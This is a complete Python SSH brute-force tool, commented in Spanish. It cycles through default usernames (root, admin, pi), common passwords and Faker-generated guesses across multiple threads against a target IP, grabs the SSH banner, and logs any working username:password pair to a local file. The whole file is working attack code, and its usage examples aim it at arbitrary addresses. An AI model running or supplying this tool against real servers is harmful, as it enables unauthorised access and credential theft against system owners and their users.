#!/usr/bin/env python3
"""
Script mejorado de fuerza bruta SSH
Incluye mejor manejo de errores, logging y opciones de configuración
"""

import paramiko
import threading
import queue
import time
import socket
import random
import argparse
import sys
import logging
import signal
from datetime import datetime
from faker import Faker

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ssh_brute.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Variables globales
fake = Faker()
q = queue.Queue()
found = False
lock = threading.Lock()
stop_threads = False
attempts = 0
successful_attempts = 0

# Lista de usuarios comunes
DEFAULT_USERS = ["root", "admin", "ubuntu", "pi", "user", "test", "guest", "operator"]

# Lista de contraseñas comunes
COMMON_PASSWORDS = [
    "password", "123456", "admin123", "qwerty", "toor", "letmein",
    "admin", "root", "123456789", "password123", "admin1234",
    "12345678", "qwerty123", "123123", "1234567", "1234567890"
]

def signal_handler(signum, frame):
    """Manejador de señales para interrupción limpia"""
    global stop_threads
    logger.info("Señal de interrupción recibida, deteniendo hilos...")
    stop_threads = True

def check_port_open(ip, port, timeout=3):
    """Verificar si el puerto está abierto"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception as e:
        logger.debug(f"Error verificando puerto: {e}")
        return False

def generate_passwords(num=1000, include_common=True):
    """Generar contraseñas dinámicas"""
    passwords = []
    
    if include_common:
        passwords.extend(COMMON_PASSWORDS)
    
    # Generar contraseñas aleatorias
    for i in range(num):
        # Contraseñas aleatorias
        passwords.append(fake.password(length=random.randint(6, 12)))
        
        # Combinaciones de usuario + números
        passwords.append(f"{fake.user_name()}{random.randint(1, 999)}")
        
        # Combinaciones de empresa + año
        company = fake.company().replace(' ', '').replace(',', '').replace('.', '')
        passwords.append(f"{company}{random.randint(2020, 2025)}")
        
        # Contraseñas con patrones comunes
        passwords.append(f"password{random.randint(1, 999)}")
        passwords.append(f"admin{random.randint(1, 999)}")
        passwords.append(f"user{random.randint(1, 999)}")
    
    return list(set(passwords))  # Eliminar duplicados

def try_ssh_connection(ip, port, user, pwd, timeout=5):
    """Intentar conexión SSH con mejor manejo de errores"""
    global found, stop_threads, attempts, successful_attempts
    
    if stop_threads:
        return False
    
    attempts += 1
    client = None
    
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Configurar timeouts
        client.connect(
            ip, 
            port=port, 
            username=user, 
            password=pwd, 
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout
        )
        
        # Si llegamos aquí, la autenticación fue exitosa
        with lock:
            if not found:
                logger.info(f"[+] ¡ÉXITO! Credenciales válidas encontradas: {user}:{pwd}")
                found = True
                stop_threads = True
                successful_attempts += 1
                
                # Guardar credenciales
                with open("ssh_credentials.txt", "a") as f:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] {ip}:{port} - {user}:{pwd}\n")
                
                return True
        
    except paramiko.AuthenticationException:
        # Autenticación fallida - esto es normal
        return False
    except paramiko.SSHException as e:
        # Error de SSH - ignorar silenciosamente
        return False
    except socket.error as e:
        # Error de socket - ignorar
        return False
    except Exception as e:
        # Otros errores - ignorar
        return False
    finally:
        if client:
            try:
                client.close()
            except:
                pass

def worker_thread(ip, port, timeout=5):
    """Hilo worker para probar credenciales"""
    global stop_threads
    
    while not q.empty() and not stop_threads:
        try:
            user, pwd = q.get(timeout=1)
            if try_ssh_connection(ip, port, user, pwd, timeout):
                break
            q.task_done()
        except queue.Empty:
            break
        except Exception as e:
            logger.debug(f"Error en worker thread: {e}")
            continue

def scan_ssh_banner(ip, port, timeout=3):
    """Escaneo del banner SSH"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.send(b"SSH-2.0-Test\n")
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except Exception as e:
        logger.warning(f"No se pudo obtener el banner SSH: {e}")
        return None

def load_wordlist(filename):
    """Cargar lista de palabras desde archivo"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error cargando archivo {filename}: {e}")
        return []

def main():
    """Función principal"""
    global found, stop_threads, attempts
    
    parser = argparse.ArgumentParser(
        description="Script mejorado de fuerza bruta SSH",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  %(prog)s 192.168.1.1
  %(prog)s 10.0.0.1 --port 2222 --threads 10
  %(prog)s 172.16.0.1 --users users.txt --passwords passwords.txt
  %(prog)s 192.168.1.100 --port 22 --threads 5 --timeout 3
        """
    )
    
    parser.add_argument("ip", help="IP del servidor objetivo")
    parser.add_argument("--port", type=int, default=22, help="Puerto SSH (default: 22)")
    parser.add_argument("--threads", type=int, default=5, help="Número de hilos (default: 5)")
    parser.add_argument("--timeout", type=int, default=5, help="Timeout de conexión en segundos (default: 5)")
    parser.add_argument("--users", help="Archivo con lista de usuarios")
    parser.add_argument("--passwords", help="Archivo con lista de contraseñas")
    parser.add_argument("--generate-passwords", type=int, default=1000, 
                       help="Número de contraseñas a generar (default: 1000)")
    parser.add_argument("--no-common", action="store_true", 
                       help="No incluir contraseñas comunes")
    parser.add_argument("--verbose", "-v", action="store_true", 
                       help="Modo verbose")
    
    args = parser.parse_args()
    
    # Configurar logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Configurar manejador de señales
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    logger.info(f"Iniciando ataque de fuerza bruta SSH en {args.ip}:{args.port}")
    logger.info(f"Configuración: {args.threads} hilos, timeout {args.timeout}s")
    
    # Verificar conectividad
    if not check_port_open(args.ip, args.port):
        logger.error(f"Puerto {args.port} no está abierto en {args.ip}")
        return 1
    
    # Escanear banner SSH
    banner = scan_ssh_banner(args.ip, args.port)
    if banner:
        logger.info(f"Banner SSH: {banner}")
    
    # Cargar usuarios
    if args.users:
        users = load_wordlist(args.users)
        if not users:
            logger.error("No se pudieron cargar usuarios del archivo")
            return 1
    else:
        users = DEFAULT_USERS
    
    # Cargar contraseñas
    if args.passwords:
        passwords = load_wordlist(args.passwords)
        if not passwords:
            logger.error("No se pudieron cargar contraseñas del archivo")
            return 1
    else:
        passwords = generate_passwords(
            num=args.generate_passwords, 
            include_common=not args.no_common
        )
    
    logger.info(f"Cargados {len(users)} usuarios y {len(passwords)} contraseñas")
    logger.info(f"Total de combinaciones a probar: {len(users) * len(passwords)}")
    
    # Llenar cola de trabajo
    for user in users:
        for pwd in passwords:
            if stop_threads:
                break
            q.put((user, pwd))
    
    if q.empty():
        logger.error("No hay credenciales para probar")
        return 1
    
    # Iniciar hilos
    threads = []
    start_time = time.time()
    
    for i in range(args.threads):
        t = threading.Thread(
            target=worker_thread, 
            args=(args.ip, args.port, args.timeout)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Monitorear progreso
    try:
        while not found and any(t.is_alive() for t in threads):
            time.sleep(1)
            elapsed = time.time() - start_time
            if elapsed > 0:
                rate = attempts / elapsed
                logger.info(f"Intentos: {attempts}, Tasa: {rate:.2f} intentos/seg")
    except KeyboardInterrupt:
        logger.info("Interrumpido por el usuario")
        stop_threads = True
    
    # Esperar a que los hilos terminen
    for t in threads:
        if t.is_alive():
            t.join(timeout=2)
    
    # Resumen final
    elapsed = time.time() - start_time
    logger.info(f"Resumen del ataque:")
    logger.info(f"  - Intentos realizados: {attempts}")
    logger.info(f"  - Tiempo total: {elapsed:.2f} segundos")
    logger.info(f"  - Tasa promedio: {attempts/elapsed:.2f} intentos/seg")
    
    if found:
        logger.info("¡Ataque completado con éxito!")
        return 0
    else:
        logger.warning("No se encontraron credenciales válidas")
        return 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        sys.exit(1)
